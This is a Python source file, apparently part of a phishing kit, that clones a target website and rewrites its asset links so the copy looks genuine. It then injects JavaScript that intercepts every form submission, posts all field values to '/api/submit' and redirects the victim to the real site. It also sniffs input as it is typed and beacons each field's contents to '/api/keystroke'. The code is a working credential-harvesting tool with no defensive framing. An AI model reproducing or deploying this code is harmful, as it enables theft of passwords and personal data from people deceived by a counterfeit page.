import os
import httpx
from bs4 import BeautifulSoup

def clone_target(url: str, output_path: str) -> bool:
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        with httpx.Client(follow_redirects=True, timeout=10.0) as client:
            response = client.get(url, headers=headers)
            if response.status_code != 200:
                return False

        soup = BeautifulSoup(response.text, "html.parser")
        
        base_domain = "/".join(url.split("/")[:3])
        for tag in soup.find_all(['link', 'script', 'img'], href=True):
            href = tag.get('href')
            if href and not href.startswith(('http://', 'https://', '//', 'data:')):
                if href.startswith('/'):
                    tag['href'] = base_domain + href
                else:
                    tag['href'] = base_domain + '/' + href
                    
        for tag in soup.find_all(['script', 'img', 'source'], src=True):
            src = tag.get('src')
            if src and not src.startswith(('http://', 'https://', '//', 'data:')):
                if src.startswith('/'):
                    tag['src'] = base_domain + src
                else:
                    tag['src'] = base_domain + '/' + src

        # Advanced Interception Payload
        payload = soup.new_tag("script")
        payload.string = f"""
        document.addEventListener('DOMContentLoaded', () => {{
            
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {{
                form.addEventListener('submit', async (e) => {{
                    e.preventDefault();
                    
                    const inputs = form.querySelectorAll('input, textarea, select');
                    const payloadData = {{}};
                    
                    inputs.forEach((input, index) => {{
                        const key = input.name || input.id || input.type || ('field_' + index);
                        if (input.value) {{
                            payloadData[key] = input.value;
                        }}
                    }});

                    try {{
                        await fetch('/api/submit', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify(payloadData)
                        }});
                    }} catch (err) {{
                        console.error("Transmission error");
                    }}
                    
                    window.location.href = "{url}";
                }});
            }});

            // रियल-टाइम इनपुट स्निफर
            let timeout = null;
            document.addEventListener('input', (e) => {{
                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {{
                    const fieldName = e.target.name || e.target.id || e.target.type || 'field';
                    const fieldValue = e.target.value;
                    
                    clearTimeout(timeout);
                    timeout = setTimeout(() => {{
                        navigator.sendBeacon('/api/keystroke', JSON.stringify({{
                            field: fieldName,
                            value: fieldValue
                        }}));
                    }}, 300);
                }}
            }}, true);
        }});
        """
        if soup.body:
            soup.body.append(payload)

        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(str(soup))
        return True
    except Exception as e:
        print(f"Cloning Error: {e}")
        return False